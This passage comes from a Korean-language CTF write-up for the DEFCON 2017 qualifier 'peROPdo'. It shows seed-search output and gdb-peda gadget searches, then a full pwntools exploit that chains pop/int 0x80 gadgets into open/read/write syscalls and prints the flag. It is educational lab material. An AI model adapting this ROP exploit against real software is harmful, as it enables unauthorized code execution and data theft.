Find! Seed : 3028129987, Area numbers[22] 0x80ed010
Find! Seed : 3030495978, Area numbers[23] 0x80ed01a
Find! Seed : 3040784799, Area numbers[22] 0x80ed004
Find! Seed : 3060692986, Area numbers[23] 0x80ecffd
Find! Seed : 3082498747, Area numbers[23] 0x80ecff7
Find! Seed : 3099659569, Area numbers[22] 0x80ecffd
Find! Seed : 3122759817, Area numbers[22] 0x80ed02f
Find! Seed : 3123196017, Area numbers[22] 0x80ed03e
Find! Seed : 3144723716, Area numbers[23] 0x80ed022
Find! Seed : 3145572974, Area numbers[23] 0x80ed037
Find! Seed : 3149013013, Area numbers[22] 0x80ecfdb
Find! Seed : 3150254665, Area numbers[22] 0x80ed033
Find! Seed : 3174936470, Area numbers[22] 0x80ed020
Find! Seed : 3188699718, Area numbers[23] 0x80ecfd9
Find! Seed : 3194883381, Area numbers[23] 0x80ed01b
Find! Seed : 3200170828, Area numbers[23] 0x80ecfc5
Find! Seed : 3204153159, Area numbers[23] 0x80ed019
Find! Seed : 3207200489, Area numbers[23] 0x80ecfc8
Find! Seed : 3208505855, Area numbers[22] 0x80ed038
Find! Seed : 3213931194, Area numbers[23] 0x80ed007
Find! Seed : 3235707612, Area numbers[23] 0x80ed03a
Find! Seed : 3267167202, Area numbers[23] 0x80ecfe4
Find! Seed : 3268587016, Area numbers[23] 0x80ed02b
Find! Seed : 3271973365, Area numbers[22] 0x80ed003
Find! Seed : 3291728011, Area numbers[22] 0x80ecfe8
Find! Seed : 3322933245, Area numbers[22] 0x80ecfc3
Find! Seed : 3323504610, Area numbers[22] 0x80ed030
Find! Seed : 3323607187, Area numbers[22] 0x80ecfe2
Find! Seed : 3324468127, Area numbers[22] 0x80ed021
Find! Seed : 3331692794, Area numbers[23] 0x80ecfe7
Find! Seed : 3336958524, Area numbers[23] 0x80ecffd
Find! Seed : 3337412556, Area numbers[22] 0x80ecfc9
Find! Seed : 3346530869, Area numbers[22] 0x80ed032
Find! Seed : 3352157406, Area numbers[22] 0x80ed01a
Find! Seed : 3363861361, Area numbers[22] 0x80ecfc3
Find! Seed : 3365392714, Area numbers[22] 0x80ed01e
Find! Seed : 3367304377, Area numbers[22] 0x80ed01f
Find! Seed : 3376874454, Area numbers[23] 0x80ed034
Find! Seed : 3379202593, Area numbers[22] 0x80ed00d
Find! Seed : 3388122843, Area numbers[23] 0x80ed010
Find! Seed : 3392934853, Area numbers[22] 0x80ed001
Find! Seed : 3427684395, Area numbers[23] 0x80ed03f
Find! Seed : 3433863112, Area numbers[22] 0x80ed003
Find! Seed : 3434498045, Area numbers[23] 0x80ed02f
Find! Seed : 3452659895, Area numbers[23] 0x80ecff7
Find! Seed : 3463220836, Area numbers[22] 0x80ed00e
Find! Seed : 3469202235, Area numbers[22] 0x80ecfdf
Find! Seed : 3470997133, Area numbers[22] 0x80ecffa
Find! Seed : 3475117694, Area numbers[22] 0x80ecfe6
Find! Seed : 3476298069, Area numbers[22] 0x80ecfe5
Find! Seed : 3480848790, Area numbers[23] 0x80ecfe4
Find! Seed : 3493762708, Area numbers[23] 0x80ecfc6
Find! Seed : 3497079387, Area numbers[23] 0x80ed00c
Find! Seed : 3512632709, Area numbers[23] 0x80ed024
Find! Seed : 3514940725, Area numbers[23] 0x80ecfff
Find! Seed : 3522653505, Area numbers[22] 0x80ed019
Find! Seed : 3531083996, Area numbers[22] 0x80ecfdc
Find! Seed : 3534534780, Area numbers[22] 0x80ecfcd
Find! Seed : 3536232385, Area numbers[22] 0x80ed028
Find! Seed : 3544831213, Area numbers[22] 0x80ed01f
Find! Seed : 3561843044, Area numbers[22] 0x80ecfd9
Find! Seed : 3565286819, Area numbers[22] 0x80ecff7
Find! Seed : 3603086103, Area numbers[23] 0x80ecfc3
Find! Seed : 3610224726, Area numbers[23] 0x80ecffb
Find! Seed : 3616548394, Area numbers[23] 0x80ecfcd
Find! Seed : 3621445208, Area numbers[23] 0x80ed00a
Find! Seed : 3624221528, Area numbers[23] 0x80ed000
Find! Seed : 3633348274, Area numbers[23] 0x80ed031
Find! Seed : 3644634757, Area numbers[22] 0x80ed015
Find! Seed : 3648600292, Area numbers[23] 0x80ed02d
Find! Seed : 3650164171, Area numbers[22] 0x80ecfcb
Find! Seed : 3653525472, Area numbers[22] 0x80ecffc
Find! Seed : 3656087406, Area numbers[23] 0x80ecfe3
Find! Seed : 3656943355, Area numbers[22] 0x80ed012
Find! Seed : 3659994835, Area numbers[22] 0x80ed007
Find! Seed : 3666936254, Area numbers[22] 0x80ecff5
Find! Seed : 3680354410, Area numbers[23] 0x80ed00f
Find! Seed : 3697074830, Area numbers[23] 0x80ed004
Find! Seed : 3704605407, Area numbers[22] 0x80ed005
Find! Seed : 3789094449, Area numbers[22] 0x80ecfcb
Find! Seed : 3798399001, Area numbers[22] 0x80ed014
Find! Seed : 3814713645, Area numbers[22] 0x80ecfd7
Find! Seed : 3822536268, Area numbers[23] 0x80ed03b
Find! Seed : 3826056673, Area numbers[22] 0x80ed026
Find! Seed : 3839934264, Area numbers[22] 0x80ed015
Find! Seed : 3841818899, Area numbers[22] 0x80ecfec
Find! Seed : 3860307206, Area numbers[22] 0x80ed003
Find! Seed : 3868561104, Area numbers[22] 0x80ed01f
Find! Seed : 3872371265, Area numbers[22] 0x80ecfe1
Find! Seed : 3878818403, Area numbers[23] 0x80ecff5
Find! Seed : 3881908726, Area numbers[22] 0x80ecfe2
Find! Seed : 3899325288, Area numbers[22] 0x80ed021
Find! Seed : 3904013670, Area numbers[22] 0x80ed02c
Find! Seed : 3915010962, Area numbers[22] 0x80ecfe9
Find! Seed : 3917323449, Area numbers[23] 0x80ecff5
Find! Seed : 3922102767, Area numbers[23] 0x80ecfc4
Find! Seed : 3924156608, Area numbers[23] 0x80ecfeb
Find! Seed : 3925518190, Area numbers[23] 0x80ecff5
Find! Seed : 3936015102, Area numbers[22] 0x80ecff4
Find! Seed : 3942857473, Area numbers[22] 0x80ed020
Find! Seed : 3944491324, Area numbers[22] 0x80ecfd8
Find! Seed : 3951918293, Area numbers[23] 0x80ecfc8
Find! Seed : 3953128364, Area numbers[22] 0x80ecfd7
Find! Seed : 3962547256, Area numbers[22] 0x80ed03f
Find! Seed : 3962943790, Area numbers[22] 0x80ed034
Find! Seed : 3969881840, Area numbers[22] 0x80ecfe3
Find! Seed : 3973427709, Area numbers[22] 0x80ecfe5
Find! Seed : 3984849122, Area numbers[23] 0x80ed003
Find! Seed : 3997811131, Area numbers[23] 0x80ed03b
Find! Seed : 4005203502, Area numbers[22] 0x80ed019
Find! Seed : 4007339907, Area numbers[22] 0x80ed007
Find! Seed : 4012774268, Area numbers[22] 0x80ecfdc
Find! Seed : 4013941975, Area numbers[23] 0x80ecffc
Find! Seed : 4022517581, Area numbers[23] 0x80ecfd7
Find! Seed : 4023040405, Area numbers[22] 0x80ecfd4
Find! Seed : 4032525660, Area numbers[23] 0x80ed024
Find! Seed : 4049131854, Area numbers[22] 0x80ed006
Find! Seed : 4058147959, Area numbers[23] 0x80ed026
Find! Seed : 4058909902, Area numbers[23] 0x80ed02c
Find! Seed : 4062792550, Area numbers[23] 0x80ecfcf
Find! Seed : 4063998149, Area numbers[22] 0x80ed01e
Find! Seed : 4072181644, Area numbers[22] 0x80ed034
Find! Seed : 4080312798, Area numbers[22] 0x80ed020
Find! Seed : 4084127915, Area numbers[22] 0x80ecffe
Find! Seed : 4088710186, Area numbers[22] 0x80ecfda
Find! Seed : 4092208137, Area numbers[23] 0x80ed00a
Find! Seed : 4092828907, Area numbers[23] 0x80ecfc6
Find! Seed : 4113274192, Area numbers[23] 0x80ecfcf
Find! Seed : 4119193911, Area numbers[22] 0x80ed00c
Find! Seed : 4141782580, Area numbers[22] 0x80ed035
Find! Seed : 4143944025, Area numbers[23] 0x80ecfe3
Find! Seed : 4145255265, Area numbers[23] 0x80ecfc3
Find! Seed : 4159298313, Area numbers[22] 0x80ecfd0
Find! Seed : 4159893867, Area numbers[23] 0x80ed017
Find! Seed : 4161000075, Area numbers[23] 0x80ecfc2
Find! Seed : 4162766288, Area numbers[23] 0x80ed021
Find! Seed : 4162922833, Area numbers[23] 0x80ed01c
Find! Seed : 4172400965, Area numbers[23] 0x80ecfc5
Find! Seed : 4177365162, Area numbers[23] 0x80ecfc7
Find! Seed : 4188435840, Area numbers[23] 0x80ecff1
Find! Seed : 4199183493, Area numbers[23] 0x80ed02a
Find! Seed : 4216689142, Area numbers[22] 0x80ed032
Find! Seed : 4238808648, Area numbers[23] 0x80ecff5
Find! Seed : 4243671975, Area numbers[22] 0x80ecfda
Find! Seed : 4254538129, Area numbers[22] 0x80ecfd9
Find! Seed : 4269482408, Area numbers[22] 0x80ecff4
Find! Seed : 4275443714, Area numbers[22] 0x80ecfde
lazenca0x0@ubuntu:~/CTF/DEFCON/peROPdo$
```

#### **Find Gadget**

* 다음과 같이 rop 구현에 필요한 Gadget을 얻을 수 있습니다.
  + "POP EDX" Addresss : 0x0806f2fa  
    - 0x08082046 : 0x20 때문에 사용할 수 없음
  + "POP ECX" Addresss : 0x080e5ee1
  + "POP EBX" Addresss : 0x08064819 

```bash title="Find Gadget - 'pop edx; pop ecx; pop ebx;'"
gdb-peda$ ropsearch 'pop edx'
Searching for ROP gadget: 'pop edx' in: binary ranges
0x08082046 : (b'5ac3')	pop edx; ret
0x0806f2fa : (b'5ac3')	pop edx; ret
...
gdb-peda$ ropsearch 'pop ecx'
Searching for ROP gadget: 'pop ecx' in: binary ranges
0x080e5ee1 : (b'59c3')	pop ecx; ret
...
gdb-peda$ ropsearch 'pop ebx'
Searching for ROP gadget: 'pop ebx' in: binary ranges
0x08064819 : (b'5bc3')	pop ebx; ret
0x0807c02e : (b'5bc3')	pop ebx; ret
...
--More--(25/902)q

gdb-peda$
```

* "POP EAX" Addresss : 0x080e558a
  + 0x080bc1e6 : 0x0b 때문에 사용할 수 없음

```bash title="Find Gadget - 'pop eax'"
gdb-peda$ ropsearch 'pop eax'
Searching for ROP gadget: 'pop eax' in: binary ranges
0x080bc1e6 : (b'58c3')	pop eax; ret
0x080e558a : (b'58c3')	pop eax; ret
0x080e3525 : (b'58c3')	pop eax; ret
...

--More--(25/27)q
gdb-peda$
```

* "POP EAX" Addresss : 0x0806fae0

```bash title="Find Gadget - 'int 0x80'"
gdb-peda$ ropsearch 'int 0x80'
Searching for ROP gadget: 'int 0x80' in: binary ranges
0x0806fae0 : (b'cd80c3')	int 0x80; ret
gdb-peda$
```

#### **rop**

* 다음과 같은 구조의 rop를 구현합니다.

```asm title="rop structure"
open('./flag')
read(3,bss,256)
write(1,bss,256)
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

BINARY = './peropdo'

elf = ELF(BINARY)
p = process(BINARY)

popEdx = 0x0806f2fa 
popEcx = 0x080e5ee1
popEbx = 0x08064819
popEax = 0x080e558a
int0x80 = 0x0806fae0
nameAddr = 0x080ECFC0

#seed
rop = p32(243015623)	# 0x4

rop += '\x00' * 8 		# 0x8
rop += './flag'			# 0x6
rop += '\x00' * 49		# 0x80ecfff - 0x80ecfd2(0x080ECFC0 + 0x4 + 0x8 + 0x6) + 0x4(POP ebp)

#open('./flag',0)
rop += p32(popEbx)
rop += p32(nameAddr + 12)
rop += p32(popEcx)
rop += p32(0)
rop += p32(popEdx)
rop += p32(0)
rop += p32(popEax)
rop += p32(0x5)
rop += p32(int0x80)

#read(3,bss,256)
rop += p32(popEbx)
rop += p32(0x3)
rop += p32(popEcx)
rop += p32(elf.bss() + 0x40)
rop += p32(popEdx)
rop += p32(256)
rop += p32(popEax)
rop += p32(0x3)
rop += p32(int0x80)
#write(1,bss,256)
rop += p32(popEbx)
rop += p32(0x1)
rop += p32(popEcx)
rop += p32(elf.bss() + 0x40)
rop += p32(popEdx)
rop += p32(256)
rop += p32(popEax)
rop += p32(0x4)
rop += p32(int0x80)

log.info("ELF BSS : " + str(hex(elf.bss() + 0x40)))
p.recvuntil('What is your name?')
p.sendline(rop)

p.recvuntil('How many dice would you like to roll?')
p.sendline('23')
p.recvuntil('Would you like to play again?')
p.sendline('n')

log.info("Flag :" + p.readline())
```

## **Flag**

|  |  |
| --- | --- |
| Flag | Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc |

## **Related Site**

* <http://bruce30262.logdown.com/posts/1784510>
* <http://bestwing.me/2017/05/01/2017-defcon-peROPdo/>
* <http://blog.ytn86.net/2017/05/defcon-2017-quals/>
* <https://bamboofox.github.io/2017/05/03/DEFCON-CTF-2017-Quals-peROPdo/>
* <https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux>